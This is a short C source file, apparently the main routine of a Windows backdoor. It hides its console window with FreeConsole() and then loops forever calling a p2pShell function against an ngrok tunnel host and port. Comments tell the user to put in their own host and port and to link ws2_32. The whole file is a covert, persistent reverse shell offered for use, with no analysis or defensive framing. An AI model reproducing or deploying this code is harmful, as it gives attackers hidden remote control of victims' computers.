#include "network.h"
int main(int argc, char* argv[]) {
    // remember to compile with -lws2_32 
    // example, change this to your host/port
    FreeConsole();
    while (1) {
        p2pShell("2.tcp.ngrok.io", 14723);
    }
}
